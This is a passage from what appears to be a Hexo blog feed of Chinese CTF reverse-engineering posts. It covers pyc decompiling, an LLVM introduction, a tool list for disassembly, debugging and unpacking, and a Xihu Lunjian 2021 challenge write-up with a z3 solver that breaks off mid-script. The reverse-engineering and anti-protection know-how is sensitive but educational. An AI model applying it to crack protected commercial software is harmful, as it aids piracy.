class="line">        a[i + <span class="number">1</span>] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = a[i];</span><br><span class="line">        a[i] = a[i + len / <span class="number">2</span>];</span><br><span class="line">        a[i + len / <span class="number">2</span>] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Obfuscation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python逆向</title>
      <link href="/2021/12/07/Re/lang_RE/python%E9%80%86%E5%90%91/"/>
      <url>/2021/12/07/Re/lang_RE/python%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="python逆向"><a href="#python逆向" class="headerlink" title="python逆向"></a>python逆向</h1><p>使用python2加载python3生成的*.pyc文件也会导致此错误。但似乎有例外</p><p>但通常会报出有魔数错误（bad-magic-number-error）以下为Stack Overflow的一篇</p><p><a href="https://stackoverflow.com/questions/514371/whats-the-bad-magic-number-error">魔数错误</a></p><p><code>re羊城杯 2020 login</code></p><p>pyinstaller编译的exe文件</p><p>使用python3</p><p>pyinstaller flag.py</p><p>在script文件夹里，会生成flag.exe_extracted，在文件夹里找到login</p><p>提出index文件加上文件头：</p><blockquote><p>420D0D0A000000000DA91B60A8090000</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM入门</title>
      <link href="/2021/12/07/Re/lang_RE/LLVM%E5%85%A5%E9%97%A8/"/>
      <url>/2021/12/07/Re/lang_RE/LLVM%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="LLVM入门"><a href="#LLVM入门" class="headerlink" title="LLVM入门"></a>LLVM入门</h1><p>LLVM是模块化、可重用的编译器以及工具链的集合，有些人把LLVM当成是一个低层的虚拟机(low level virtual machine)，但官方给出的解释是这样的:</p><blockquote><p>The name “LLVM” itself is not an acronym; it is the full name of the project.</p></blockquote><p>也就是说LLVM并不是一个缩写，而是整个项目的全名。<br>LLVM和传统的编译器(GCC)是有差别的</p><h2 id="传统的编译器架构"><a href="#传统的编译器架构" class="headerlink" title="传统的编译器架构"></a>传统的编译器架构</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190426000156-7346b192-6773-1.jpg" alt="img"></p><p>传统的编译器架构主要分为三个部分</p><ul><li>Frontend:前端<br>包括词法分析、语法分析、语义分析、中间代码生成</li><li>Optimizer:优化器<br>主要是对编译前端对生成的中间代码的优化</li><li>Backend:后端<br>翻译中间代码为native机器码</li></ul><h2 id="LLVM编译器架构"><a href="#LLVM编译器架构" class="headerlink" title="LLVM编译器架构"></a>LLVM编译器架构</h2><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190426000236-8b4059ce-6773-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190426000236-8b4059ce-6773-1.jpg" alt="img"></a></p><p>LLVM编译器套件与传统编译器架构的不同之处主要在于</p><ul><li>LLVM编译器的前端其它层(优化器、后端)是分离的，LLVM专门有一个Clang子项目用来对源码进行编译，生成IR(intermediate representation)中间字节码;而传统编译器的代表(GCC)由于编译前后端耦合度太高，增加一个前端语言支持或者一个后端平台支持将会变得异常复杂。相比之下LLVM由于是分离式架构，其组件复用性就很高，增加语言/平台支持也相对容易，增加一个新的编程语言，就增加一个新的前端组件，增加一个新的平台支持，就增加一个新的后端组件。</li><li>LLVM编译器不同的前端统一使用相同的中间码，不像GCC有各种风格(intel&amp;ATT)</li><li>LLVM经常被用于一些解释型语言的动态编译(优化)。类似的JAVA虚拟机(JVM)的JIT(好像现在就有厂在做基于LLVM的JAVA JIT编译器，负责将高层字节码(java-bytecode)解析成相对底层的IR中间码，之后编译成相应平台的机器码执行。</li><li>LLVM也经常被用于一些语言的静态编译，类似的Objective-c就是使用Clang进行编译(之前其实也是使用GCC的,但现在连Xcode的内置编译器都换成Clang了)，据说编译时间是GCC的1/3，语法树占用内存是GCC的1/5，而且诊断信息可读性强，不像GCC是一大坨不容易识别的那种。</li></ul><h2 id="0x2-狭义的LLVM和广义的LLVM"><a href="#0x2-狭义的LLVM和广义的LLVM" class="headerlink" title="0x2 狭义的LLVM和广义的LLVM"></a>0x2 狭义的LLVM和广义的LLVM</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190426000236-8b4059ce-6773-1.jpg" alt="img"></p><p>广义的LLVM通常指LLVM编译器的整体架构，而狭义的LLVM通常指不包含前端，只实现中间代码优化和native码生成的部分。IR中间码需要多个pass进行一系列优化后再进行翻译。</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Re学习目录</title>
      <link href="/2021/12/07/Re/Re%E5%AD%A6%E4%B9%A0%E7%9B%AE%E5%BD%95/"/>
      <url>/2021/12/07/Re/Re%E5%AD%A6%E4%B9%A0%E7%9B%AE%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Re学习目录"><a href="#Re学习目录" class="headerlink" title="Re学习目录"></a>Re学习目录</h1><h2 id="常见加密"><a href="#常见加密" class="headerlink" title="常见加密"></a>常见加密</h2><p>工具</p><p><strong>IDA：</strong>FindCrypt <a href="https://blog.csdn.net/userpass_word/article/details/80484467">IDA 7.0版本安装查询加密算法的findcrypt3脚本插件的详细步骤</a></p><p><strong>PEID：</strong>KANAL（Krypto ANALyzer） (PEiD自带)</p><p>各类加密解析：<a href="https://bbs.pediy.com/thread-265939.htm">逆向中常见的Hash算法和对称加密算法的分析</a></p><h3 id="特征值识别"><a href="#特征值识别" class="headerlink" title="特征值识别"></a>特征值识别</h3><p><strong>注意特征值可能会改变</strong></p><p>TEA | AES | DES | BlowFish | MD5 | SHA1 | CRC32 | Base64</p><h3 id="特征算法识别"><a href="#特征算法识别" class="headerlink" title="特征算法识别"></a>特征算法识别</h3><p>RC4 | Base64 | TEA | AES | DES | MD5</p><h3 id="第三方库识别"><a href="#第三方库识别" class="headerlink" title="第三方库识别"></a>第三方库识别</h3><ul><li><p><strong>字符串报错</strong></p></li><li><p><strong>函数签名识别</strong></p><p>Load File -&gt; Flirter file</p></li><li><p><strong>Diff二进制对比识别</strong></p></li></ul><h2 id="逆向常见方法"><a href="#逆向常见方法" class="headerlink" title="逆向常见方法"></a>逆向常见方法</h2><h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><ul><li><strong>python虚拟机</strong>：python的库之间会起冲突，比如angr会修改z3，那么需要一个python的虚拟环境</li><li><strong>z3</strong>：一个泛型约束求解的东西</li><li><strong>angr</strong>：强大的模拟执行工具，有些z3不能解的这个可以解</li><li><strong>去平坦化（OLLVM）</strong>：编译原理相关，可以试试用脚本还原 （<a href="https://security.tencent.com/index.php/blog/msg/112">利用符号执行去除控制流平坦化</a>）</li></ul><h3 id="Pin插桩"><a href="#Pin插桩" class="headerlink" title="Pin插桩"></a>Pin插桩</h3><p>貌似国赛都没考过，但是可以方便分析，主要涉及一些工具和hook编程</p><h3 id="混淆和保护"><a href="#混淆和保护" class="headerlink" title="混淆和保护"></a>混淆和保护</h3><p>一般就是花指令，CMS、OLLVM、VM逆向、反调试等</p><p><a href="https://www.anquanke.com/post/id/236490">花指令总结</a></p><p>有些脚本可能会临时找</p><h3 id="WebAssembly"><a href="#WebAssembly" class="headerlink" title="WebAssembly"></a>WebAssembly</h3><p><a href="https://www.wasm.com.cn/">wasm官网</a></p><p><a href="https://www.anquanke.com/post/id/179556">一步步学习Webassembly逆向分析方法</a></p><h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>详见：windows反调试笔记.md（API）、 CTFer成长之路-Nu1L战队/从0到1 、CTFWiki</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>主要利用的是 API 断点检测 其他技巧</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>ptrace开启两个进程（MRCTF2021有涉及）</p><h2 id="游戏逆向"><a href="#游戏逆向" class="headerlink" title="游戏逆向"></a>游戏逆向</h2><p>一般是Unity游戏的逆向，Unity又是基于C#编写，所以静态分析会使用类似<strong>Dnspy</strong>等工具</p><p>修改内存的话是<strong>CheateEngine</strong>，还是比较主流的修改器制作</p><h2 id="高级语言逆向"><a href="#高级语言逆向" class="headerlink" title="高级语言逆向"></a>高级语言逆向</h2><p>一般有：<strong>python Golang Rust</strong></p><ul><li><strong>python</strong>：pyc逆向，python字节码逆向，python-installer逆向</li><li>**Golang **：IDAGolangHelper<ul><li><a href="https://links.jianshu.com/go?to=https://www.anquanke.com/post/id/170332">无符号Golang程序逆向方法解析</a></li><li><a href="https://links.jianshu.com/go?to=https://studygolang.com/articles/6926">golang base64加密与解密</a></li><li><a href="https://links.jianshu.com/go?to=https://blog.csdn.net/xiangshangbashaonian/article/details/83146678">MIPS架构的CTF逆向题–SUCTFbabyre题目writeup</a></li></ul></li></ul><h2 id="DUMP内存"><a href="#DUMP内存" class="headerlink" title="DUMP内存"></a>DUMP内存</h2><p>万能的脱壳方法，加壳的程序在运行时肯定是自身脱壳的，所以内存的程序是已经脱了壳的</p><ul><li>火绒剑 PC_Hunter windows任务管理器</li></ul><h1 id="Re工具"><a href="#Re工具" class="headerlink" title="Re工具"></a>Re工具</h1><h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><h3 id="万能"><a href="#万能" class="headerlink" title="万能"></a>万能</h3><ul><li><strong>ghidra</strong>：美国NSA出品，能搞定plt混乱等</li></ul><h3 id="IDA相关"><a href="#IDA相关" class="headerlink" title="IDA相关"></a>IDA相关</h3><ul><li><strong>ida_6.8</strong> ：适合32位系统(windowsXP)</li><li><strong>ida_7.0</strong>：主流</li><li><strong>ida_7.5</strong>：最新版，增加一些过混淆，异构程序F5</li></ul><p><strong>IDA其他常用的一些插件</strong></p><p><strong><a href="https://github.com/veritas501/PltResolver">PLTResolver</a></strong> - 恢复被打乱的PLT，方便逆向<br><strong>IDA FLIRT Signature Database</strong> – 用于识别静态编译的可执行文件中的库函数<br><strong>Find Crypt</strong> – 寻找常用加密算法中的常数（需要安装 yara-python）<br><strong>IDA signsrch</strong> – 寻找二进制文件所使用的加密、压缩算法<br><strong>Ponce</strong> – 污点分析和符号化执行工具<br><strong>snowman decompiler</strong> – C/C++反汇编插件（F3 进行反汇编）<br><strong>CodeXplorer</strong> – 自动类型重建以及对象浏览（C++）（jump to disasm)<br><strong>IDA Ref</strong> – 汇编指令注释（支持arm，x86，mips）<br><strong>auto re</strong> – 函数自动重命名<br><strong>nao – dead code</strong> 清除HexRaysPyTools – 类/结构体创建和虚函数表检测<br><strong>DIE</strong> – 动态调试增强工具，保存函数调用上下文信息<br><strong>sk3wldbg</strong> – IDA 动态调试器，支持多平台<br><strong>idaemu</strong> – 模拟代码执行（支持X86、ARM平台）<br><strong>Diaphora</strong> – 程序差异比较<br><strong>Keypatch</strong> – 基于 Keystone 的 Patch 二进制文件插件<br><strong>FRIEND</strong> – 哪里不会点哪里，提升汇编格式的可读性、提供指令、寄存器的文档等<br><strong>SimplifyGraph</strong> – 简化复杂的函数流程图<br><strong>bincat</strong> – 静态二进制代码分析工具包，2017 Hex-Rays 插件第一名<br><strong>golang_loader_assist</strong> – Golang编译的二进制文件分析助手</p><h3 id="安卓反汇编"><a href="#安卓反汇编" class="headerlink" title="安卓反汇编"></a>安卓反汇编</h3><ul><li><strong>jadx-gui</strong>：安卓逆向静态审计</li><li><strong>jeb</strong></li><li><strong>dex-tools</strong></li><li><strong>apktoolbox</strong>：smail反编译与编译，方便修改代码</li></ul><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul><li><strong>Olldbg</strong>：经典，插件多，但是只能调试32位</li><li><strong>x32/x64dbg</strong>：和od差不多，但是能调试的64位，插件较少</li><li><strong>windbg</strong>：windows内核调试</li><li><strong>CheatEngine</strong>：常见于游戏逆向</li></ul><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><ul><li>gdb<ul><li>gdb各种插件，pwngdb</li></ul></li></ul><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><ul><li><strong>android_killer</strong>：经典apk动调工具</li><li><strong>android_studio</strong>：开发调试</li></ul><h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><ul><li>qemu或者docker挂上ida_server调</li></ul><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><ul><li><strong>PEID</strong></li><li><strong>DIE</strong></li><li><strong>EXEINFO</strong></li></ul><p><strong>查看WIN的PE文件结构</strong></p><ul><li><strong>LordPE</strong></li><li><strong>Stud_PE</strong></li></ul><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><ul><li>checksec（详细参考pwn中pwntools安装）</li></ul><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><ul><li><p>unpack -&gt; execute</p><p>直接将程序代码全部解压到内存中再继续执行程序代码</p></li><li><p>unpack -&gt; execute -&gt; unpack -&gt; execute …</p><p>解压部分代码，再边解压边执行</p></li><li><p>unpack -&gt; [decoder | encoded code] -&gt; decode -&gt; execute</p><p>程序代码有过编码，<strong>在解压后再运行函数将真正的程序代码解码执</strong></p></li><li><p><strong>UPX</strong></p></li><li><p><strong>PECompat</strong></p></li><li><p><strong>ASpack</strong></p></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.52bug.cn/hacktool/2992.html">Hacking Tools搜罗大集合</a>、</p><p><a href="https://blog.csdn.net/userpass_word/article/details/80484467">IDA 7.0版本安装查询加密算法的findcrypt3脚本插件的详细步骤</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/112">利用符号执行去除控制流平坦化</a></p><p><a href="https://github.com/sibears/IDAGolangHelper">IDAGolangHelper</a></p><p><a href="https://github.com/nihilus/IDA_Signsrch">IDA_Signsrch</a></p><p><a href="https://www.52pojie.cn/thread-1128884-1-1.html">frida入门总结</a></p><p><a href="https://www.wasm.com.cn/">wasm官网</a></p><p><a href="https://www.anquanke.com/post/id/179556">一步步学习Webassembly逆向分析方法</a></p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>空想的diary_1024</title>
      <link href="/2021/12/07/diary/%E6%97%A5%E8%AE%B0/"/>
      <url>/2021/12/07/diary/%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="diary"><a href="#diary" class="headerlink" title="diary"></a>diary</h1><p>整理一下，做个记录</p><h2 id="2021-12-7"><a href="#2021-12-7" class="headerlink" title="2021-12-7"></a>2021-12-7</h2><p>整理一下博客，每天一题CTF。快考试了，争取不挂科555。还有四级。</p>]]></content>
      
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM逆向</title>
      <link href="/2021/12/07/Re/lang_RE/VM%E9%80%86%E5%90%91/"/>
      <url>/2021/12/07/Re/lang_RE/VM%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="VM逆向"><a href="#VM逆向" class="headerlink" title="VM逆向"></a>VM逆向</h1>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西湖论剑2021WP_复现</title>
      <link href="/2021/12/06/WP/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021WP/"/>
      <url>/2021/12/06/WP/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021WP/</url>
      
        <content type="html"><![CDATA[<h1 id="西湖论剑2021WP-RE复现"><a href="#西湖论剑2021WP-RE复现" class="headerlink" title="西湖论剑2021WP_RE复现"></a>西湖论剑2021WP_RE复现</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>32位无壳，逻辑很简单。粘上主要实现代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%40s&quot;</span>, (<span class="keyword">char</span>)flag);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(flag) != <span class="number">40</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x28</span>; i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        v4 = ((v5[j] &amp; flag[i + <span class="number">3</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">3</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)flag[i + <span class="number">3</span>]) &gt;&gt; ((<span class="number">3</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; flag[i + <span class="number">2</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">2</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)flag[i + <span class="number">2</span>]) &gt;&gt; ((<span class="number">2</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; flag[i + <span class="number">1</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">1</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)flag[i + <span class="number">1</span>]) &gt;&gt; ((<span class="number">1</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; (<span class="keyword">unsigned</span> __int8)flag[i]) &lt;&lt; (<span class="number">8</span> - -j % <span class="number">8u</span>)) | ((v5[j] &amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)flag[i]) &gt;&gt; (-j % <span class="number">8u</span>));</span><br><span class="line">        Buf2[j + i] = byte_405000[(<span class="keyword">unsigned</span> __int8)(((v5[j] &amp; (<span class="keyword">unsigned</span> __int8)flag[i + <span class="number">7</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">7</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)flag[i + <span class="number">7</span>]) &gt;&gt; ((<span class="number">7</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; flag[i + <span class="number">6</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">6</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)flag[i + <span class="number">6</span>]) &gt;&gt; ((<span class="number">6</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; flag[i + <span class="number">5</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">5</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)flag[i + <span class="number">5</span>]) &gt;&gt; ((<span class="number">5</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; flag[i + <span class="number">4</span>]) &lt;&lt; (<span class="number">8</span> - (<span class="number">4</span> - j) % <span class="number">8u</span>)) | ((v5[j] &amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)flag[i + <span class="number">4</span>]) &gt;&gt; ((<span class="number">4</span> - j) % <span class="number">8u</span>)) | v4)];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">memcmp</span>(&amp;unk_405100, Buf2, <span class="number">0x28</span>u))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Congratulations&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;flag is DASCTF&#123;your input&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><p>但脚本不好写，导致当时没出来，z3不能直接进行位运算，需要加上BitVecs，当时也没怎么看懂，还是脚本写少了，都分析出来了就是出不来。</p><p>进行整理v0和buf2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">v0 = </span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">3</span> + i)) &lt;&lt; (<span class="number">8</span> - (<span class="number">3</span> - j) % <span class="number">8u</span>)) | </span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">3</span> + i)) &gt;&gt; (<span class="number">3</span> - j) % <span class="number">8u</span>) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">2</span> + i)) &lt;&lt; (<span class="number">8</span> - (<span class="number">2</span> - j) % <span class="number">8u</span>)) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">2</span> + i)) &gt;&gt; (<span class="number">2</span> - j) % <span class="number">8u</span>) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">1</span> + i)) &lt;&lt; (<span class="number">8</span> - (<span class="number">1</span> - j) % <span class="number">8u</span>)) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">1</span> + i)) &gt;&gt; (<span class="number">1</span> - j) % <span class="number">8u</span>) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag + i)) &lt;&lt; (<span class="number">8</span> - -j % <span class="number">8u</span>)) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag + i)) &gt;&gt; -j % <span class="number">8u</span>);</span><br><span class="line">        </span><br><span class="line">Buf2[j + i] = byte_405000[</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">7</span> + i) &lt;&lt; (<span class="number">8</span> - (<span class="number">7</span> - j) % <span class="number">8u</span>) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">7</span> + i) &gt;&gt; (<span class="number">7</span> - j) % <span class="number">8u</span>) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">6</span> + i)) &lt;&lt; (<span class="number">8</span> - (<span class="number">6</span> - j) % <span class="number">8u</span>)) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">6</span> + i)) &gt;&gt; (<span class="number">6</span> - j) % <span class="number">8u</span>) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">5</span> + i)) &lt;&lt; (<span class="number">8</span> - (<span class="number">5</span> - j) % <span class="number">8u</span>)) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">5</span> + i)) &gt;&gt; (<span class="number">5</span> - j) % <span class="number">8u</span>) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">4</span> + i)) &lt;&lt; (<span class="number">8</span> - (<span class="number">4</span> - j) % <span class="number">8u</span>)) |</span><br><span class="line">  ((*(&amp;v2 + j) &amp; *(flag+<span class="number">4</span> + i)) &gt;&gt; (<span class="number">4</span> - j) % <span class="number">8u</span>) |</span><br><span class="line">  v0)];  </span><br></pre></td></tr></table></figure><p>z3上，写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">Buf2 = [<span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x24</span>, <span class="number">0x36</span>, <span class="number">0x9D</span>, <span class="number">0x71</span>, <span class="number">0xB8</span>, <span class="number">0xC8</span>, <span class="number">0x65</span>, <span class="number">0xFB</span>, <span class="number">0x87</span>, <span class="number">0x7F</span>, <span class="number">0x9A</span>, <span class="number">0x9C</span>, <span class="number">0xB1</span>, <span class="number">0xDF</span>, <span class="number">0x65</span>, <span class="number">0x8F</span>, <span class="number">0x9D</span>, <span class="number">0x39</span>, <span class="number">0x8F</span>, <span class="number">0x11</span>, <span class="number">0xF6</span>, <span class="number">0x8E</span>, <span class="number">0x65</span>, <span class="number">0x42</span>, <span class="number">0xDA</span>, <span class="number">0xB4</span>, <span class="number">0x8C</span>, <span class="number">0x39</span>, <span class="number">0xFB</span>, <span class="number">0x99</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x6A</span>, <span class="number">0xCA</span>, <span class="number">0x63</span>, <span class="number">0xE7</span>, <span class="number">0xA4</span>, <span class="number">0x79</span>]</span><br><span class="line">byte_405000 = [<span class="number">0x65</span>, <span class="number">0x08</span>, <span class="number">0xF7</span>, <span class="number">0x12</span>, <span class="number">0xBC</span>, <span class="number">0xC3</span>, <span class="number">0xCF</span>, <span class="number">0xB8</span>, <span class="number">0x83</span>, <span class="number">0x7B</span>, <span class="number">0x02</span>, <span class="number">0xD5</span>, <span class="number">0x34</span>, <span class="number">0xBD</span>, <span class="number">0x9F</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0xD4</span>, <span class="number">0xD7</span>, <span class="number">0xEB</span>, <span class="number">0x90</span>, <span class="number">0x89</span>, <span class="number">0x5E</span>, <span class="number">0x54</span>, <span class="number">0x01</span>, <span class="number">0x7D</span>, <span class="number">0xF4</span>, <span class="number">0x11</span>, <span class="number">0xFF</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xAD</span>, <span class="number">0x57</span>, <span class="number">0x46</span>, <span class="number">0x67</span>, <span class="number">0x2A</span>, <span class="number">0x9D</span>, <span class="number">0x7F</span>, <span class="number">0xD2</span>, <span class="number">0xE1</span>, <span class="number">0x21</span>, <span class="number">0x8B</span>, <span class="number">0x1D</span>, <span class="number">0x5A</span>, <span class="number">0x91</span>, <span class="number">0x38</span>, <span class="number">0x94</span>, <span class="number">0xF9</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xCA</span>, <span class="number">0xE8</span>, <span class="number">0xCB</span>, <span class="number">0x5F</span>, <span class="number">0x19</span>, <span class="number">0xF6</span>, <span class="number">0xF0</span>, <span class="number">0x3C</span>, <span class="number">0xDE</span>, <span class="number">0xDA</span>, <span class="number">0xEA</span>, <span class="number">0x9C</span>, <span class="number">0x14</span>, <span class="number">0x75</span>, <span class="number">0xA4</span>, <span class="number">0x0D</span>, <span class="number">0x25</span>, <span class="number">0x58</span>, <span class="number">0xFC</span>, <span class="number">0x44</span>, <span class="number">0x86</span>, <span class="number">0x05</span>, <span class="number">0x6B</span>, <span class="number">0x43</span>, <span class="number">0x9A</span>, <span class="number">0x6D</span>, <span class="number">0xD1</span>, <span class="number">0x63</span>, <span class="number">0x98</span>, <span class="number">0x68</span>, <span class="number">0x2D</span>, <span class="number">0x52</span>, <span class="number">0x3D</span>, <span class="number">0xDD</span>, <span class="number">0x88</span>, <span class="number">0xD6</span>, <span class="number">0xD0</span>, <span class="number">0xA2</span>, <span class="number">0xED</span>, <span class="number">0xA5</span>, <span class="number">0x3B</span>, <span class="number">0x45</span>, <span class="number">0x3E</span>, <span class="number">0xF2</span>, <span class="number">0x22</span>, <span 